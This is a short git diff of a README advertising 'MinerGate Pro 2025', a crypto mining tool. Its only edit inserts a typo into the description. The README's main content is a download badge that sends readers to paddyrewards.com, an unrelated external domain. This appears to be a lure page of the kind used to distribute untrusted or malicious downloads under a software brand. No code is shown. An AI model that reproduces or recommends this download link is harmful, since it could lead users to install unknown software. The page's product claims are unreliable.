@@ -1,6 +1,6 @@
 # MinerGate Pro 2025
 
-MinerGate Pro 2025 is a multi-currency mining platform that allows users to mine cryptocurrencies with GPU and CPU optimization. Featuring smart pool switching, real-time monitoring, and an intuitive interface, it’s designed for both beginners and advanced miners.
+MinerGate Pro 2025 is a multi-currency mining platform that allows users to mine cryptohcurrencies with GPU and CPU optimization. Featuring smart pool switching, real-time monitoring, and an intuitive interface, it’s designed for both beginners and advanced miners.
 
 [![Download MinerGate Pro](https://img.shields.io/badge/Download-MinerGate%20Pro-darkblue)](https://paddyrewards.com/)
 
